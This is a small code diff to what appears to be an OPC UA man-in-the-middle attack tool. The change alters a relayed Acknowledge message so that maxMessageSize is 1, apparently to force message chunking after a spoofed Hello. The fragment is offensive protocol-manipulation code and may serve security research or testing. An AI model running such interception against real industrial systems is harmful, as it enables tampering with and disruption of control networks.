@@ -1932,7 +1932,9 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
       
       read_client_msg(clientsock, HelloMessage)
       log('Got Hello from client. Sending spoofed version to server.')
-      write_client_msg(clientsock, opc_exchange(serversock, spoofed_hello, AckMessage()))
+      ack = opc_exchange(serversock, spoofed_hello, AckMessage())
+      ack.maxMessageSize = 1
+      write_client_msg(clientsock, ack)
       
       # Forward OPN. Response may be chunked.
       client_opn = read_client_msg(clientsock, OpenSecureChannelMessage)
